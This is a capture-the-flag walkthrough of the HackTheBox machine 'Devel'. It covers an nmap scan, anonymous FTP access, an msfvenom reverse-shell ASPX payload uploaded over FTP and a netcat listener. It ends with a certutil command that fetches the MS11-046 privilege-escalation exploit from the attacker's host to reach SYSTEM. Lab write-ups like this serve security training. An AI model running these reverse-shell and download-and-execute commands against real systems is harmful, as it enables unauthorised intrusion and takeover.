## Devel HackTheBox
## Level: Easy
<hr>

Lets get started

# Recon

## PortScanning

command:``` sudo nmap -A 10.10.10.5 -T4  -v -p-```

```
# Nmap 7.93 scan initiated Mon May 15 14:42:45 2023 as: nmap -A -T4 -v -p- -oN Devel 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.26s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT 
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.006 days (since Mon May 15 14:38:36 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   306.59 ms 10.10.14.1
2   306.73 ms 10.10.10.5

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 15 14:47:18 2023 -- 1 IP address (1 host up) scanned in 273.56 seconds
```
From our above scan, we have 2 opened ports. Port 21 which runs ftp and port 80 which runs http. We'll be starting our enumeration today from port 21.



# Enumeration (port 21)

From our nmap scan you should see something like ```ftp-anon: Anonymous FTP login allowed```, this means we can login using default credentials

```username:anonymous```        ```password:anonymous```

command:```ftp 10.10.10.5```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Devel]
└─$ ftp 10.10.10.5   
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:bl4ck4non): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
05-15-23  04:53PM                   16 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```
cool, we are logged in. We have quite a number of files here hehe. Well, I found a connection between port 21 and port 80.

What do I mean?? 

What I am trying to say one can view the files available on the ftp server (port 21) also on the web server (port 80). Lets enumerate port 80

We'll come back to this port




# Enumeration (Port 80)

Lets navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3c20c41a-5869-4783-9eb8-f3b4c19c8201)

This is what we get after navigating to the webpage. If you recall from the ftp server we found the files ```welcome.png``` and ```test.txt```. Lets try to access them here

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0abd0361-4044-418c-bd7e-e12f63541659)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5adc8a2e-d586-4b2f-8495-901b3e6c6e10)

hehe, as you can access the files truly from the webpage.

Now, how can we exploit this?? We can go ahead to create a reverse shell and upload it to the ftp server, then we try to execute the reverse shell from the webpage hehe, interesting right?? Lets pop some shells😎




# Exploitation

Lets create our reverse shell

command:```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.14.31 LPORT=4443 -f aspx -o abeg.aspx```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Devel]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.31 LPORT=4443 -f aspx -o abeg.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2891 bytes
Saved as: abeg.aspx
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Devel]
└─$ ls
abeg.aspx  Devel  
```
cool, now lets upload this to the ftp server using the ```put``` command.

command:```ftp 10.10.10.5```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Devel]
└─$ ftp 10.10.10.5                                                                                                                                    
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:bl4ck4non): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la

229 Entering Extended Passive Mode (|||49179|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
05-15-23  04:53PM                   16 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
ftp> put abeg.aspx
local: abeg.aspx remote: abeg.aspx
229 Entering Extended Passive Mode (|||49180|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************************************************|  2928       29.70 MiB/s    --:-- ETA
226 Transfer complete.
2928 bytes sent in 00:00 (9.44 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||49181|)
125 Data connection already open; Transfer starting.
05-15-23  05:40PM                 2928 abeg.aspx
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
05-15-23  04:53PM                   16 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
Reverse shell successfully uploaded hehe. The next thing to do is to access it from the webpage.

Ensure you set up your netcat listener ```nc -lvnp 4443``` before accessing the reverse shell from the webpage.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5b37a08f-aa79-4356-9a17-b517ebedd9f1)

Now, lets access the reverse shell

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/99496086-9f7f-4f3c-9919-00a43002c868)

Checking our netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/559cbb72-c446-4545-981a-dc8059f0dc22)

cool, we got a shell. Now lets escalate our privileges.




# Privilege Escalation

Using the command ```systeminfo``` I found something interesting

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b4623a11-c08c-40a0-ae16-704ea884a066)

Lets look for an exploit for this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9597ec4e-35dc-4416-bfd9-53792f0c2c37)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/41a5dfd9-1d93-49c1-8ea4-6b8c01312e0a)

We'll be downloading executable, you can download the executable [here](https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/MS11-046.exe)

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Devel]
└─$ ls
40564.c  abeg.aspx  Devel  MS11-046.exe
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Devel]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Now that we've downloaded this, we'll be sending it over to the target's machine.

To receive the file on the target's machine ensure you are in the ```Temp``` directory ```cd c:\Windows\Temp```

command:```certutil -urlcache -f http://10.10.14.31/MS11-046.exe abeg.exe```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/83b7c9b7-e4e1-4e1e-bec3-e7e54bef6865)

cool, lets try to run it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3471808d-b1d2-4436-ab3d-5c372d414e43)

Nice, we got a shell as ```nt authority\system```. 


That will be all for today
<br> <br>
[Back To Home](../../index.md)











































